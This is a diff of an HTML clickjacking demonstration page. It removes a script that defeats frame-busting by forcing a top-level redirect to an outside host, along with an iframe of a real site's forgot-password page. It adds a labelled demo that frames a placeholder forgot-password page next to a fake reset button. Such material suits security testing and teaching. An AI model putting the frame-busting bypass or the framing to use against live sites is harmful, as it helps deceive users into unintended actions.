@@ -1,14 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Clickjacking Demo</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+  }
+  .container {
+    width: 80%;
+    margin: 0 auto;
+    text-align: center;
+    padding-top: 50px;
+  }
+  iframe {
+    display: block;
+    margin: 0 auto;
+    border: none;
+    width: 100%;
+    height: 100%;
+  }
+</style>
+</head>
+<body>
+<div class="container">
+  <h2>Clickjacking Demo</h2>
+  <p>This is a demonstration of clickjacking vulnerability on a forgot password page.</p>
+  <p>Please click the button below to reset your password:</p>
+  <button onclick="resetPassword()">Reset Password</button>
+  <iframe src="https://example.com/forgot-password" title="Forgot Password Page"></iframe>
+</div>
+
 <script>
-    var prevent_bust = 0;
-    window.onbeforeunload = function() {
-        prevent_bust++;
-    };
-    setInterval(
-        function() {
-            if (prevent_bust > 0) {
-                prevent_bust -= 2;
-                window.top.location = "http://cj.matrixploit.com";
-            }
-        }, 1);
+  function resetPassword() {
+    alert("Your password has been reset!");
+  }
 </script>
-<iframe src="https://www.relume.io/app/forgot-password?">
+
+</body>
+</html>
